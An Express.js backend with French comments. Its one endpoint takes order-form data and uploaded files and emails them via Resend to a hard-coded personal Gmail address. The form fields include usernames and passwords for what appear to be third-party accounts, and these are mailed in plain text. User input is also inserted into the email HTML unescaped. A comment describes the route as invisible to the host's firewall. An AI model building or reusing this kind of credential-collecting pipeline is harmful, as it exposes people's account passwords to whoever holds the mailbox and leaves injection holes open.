import 'dotenv/config'; 
import express from 'express';
import multer from 'multer';
import cors from 'cors';
import { Resend } from 'resend'; 

const app = express();

// Autorise votre machine locale et votre site Frontend Render
app.use(cors({
  origin: ['http://localhost:5173', 'http://localhost:3000', 'https://nexus-ob.onrender.com']
}));

app.use(express.json());

// Gestion des fichiers en mémoire vive pour un transfert direct vers l'API
const upload = multer({ storage: multer.memoryStorage() });

// Initialisation de Resend avec votre variable d'environnement sécurisée
const resend = new Resend(process.env.RESEND_API_KEY);

app.post('/api/send-order', upload.any(), async (req, res) => {
  try {
    const { 
      pack, 
      identifiantFT, 
      passwordFT, 
      emailDedicace, 
      passwordDedicace, 
      methodePaiement,
      niveau_etude,
      annee_en_cours
    } = req.body;
    
    const files = req.files || [];

    if (!process.env.RESEND_API_KEY) {
      console.error("❌ ERREUR : Clé RESEND_API_KEY introuvable.");
      return res.status(500).json({ success: false, message: "Configuration serveur manquante." });
    }

    // Extraction et conversion des bulletins/fichiers pour Resend
    const attachments = files.map(file => ({
      filename: file.originalname,
      content: file.buffer 
    }));

    // Envoi via tunnel HTTP (Totalement transparent pour le Firewall de Render)
    const { data, error } = await resend.emails.send({
      from: 'NEXUS System <onboarding@resend.dev>', 
      to: 'andregomis3954@gmail.com',
      subject: `🚀 NEXUS - DOSSIER : ${pack || 'Message Contact'}`,
      html: `
        <div style="font-family: sans-serif; line-height: 1.6; color: #333; padding: 20px; border: 2px solid #059669; border-radius: 15px;">
          <h2 style="color: #059669;">Nouveau Flux Reçu - NEXUS</h2>
          <p><strong>Type / Pack :</strong> ${pack || 'Non défini'}</p>
          <p><strong>Méthode :</strong> ${methodePaiement || 'Non spécifiée'}</p>
          
          <div style="background: #f4f4f4; padding: 15px; border-radius: 10px; margin: 15px 0;">
            <h3 style="margin-top: 0; color: #0284c7;">🔑 Identifiants transmis</h3>
            <p><strong>Identifiant / Email :</strong> ${identifiantFT || emailDedicace || 'Non fourni'}</p>
            <p><strong>Mot de passe :</strong> ${passwordFT || passwordDedicace || 'Non fourni'}</p>
          </div>

          ${niveau_etude ? `
          <div style="background: #f4f4f4; padding: 15px; border-radius: 10px; margin: 15px 0;">
            <h3 style="margin-top: 0; color: #b45309;">🎓 Informations Campus</h3>
            <p><strong>Niveau d'études :</strong> ${niveau_etude}</p>
            <p><strong>Année en cours :</strong> ${annee_en_cours}</p>
          </div>
          ` : ''}

          <p style="font-size: 12px; color: #666; margin-top: 20px;">Nombre de pièces jointes incluses : ${attachments.length}</p>
        </div>
      `,
      attachments: attachments
    });

    if (error) {
      console.error("❌ Erreur API Resend :", error);
      return res.status(400).json({ success: false, message: error.message });
    }

    console.log("✅ Mail envoyé avec succès via Resend !", data);
    return res.status(200).json({ success: true, message: "Transmis avec succès." });

  } catch (error) {
    console.error("❌ Erreur serveur interne :", error);
    return res.status(500).json({ success: false, message: error.message });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 [SERVEUR] Actif sur le port ${PORT}`);
});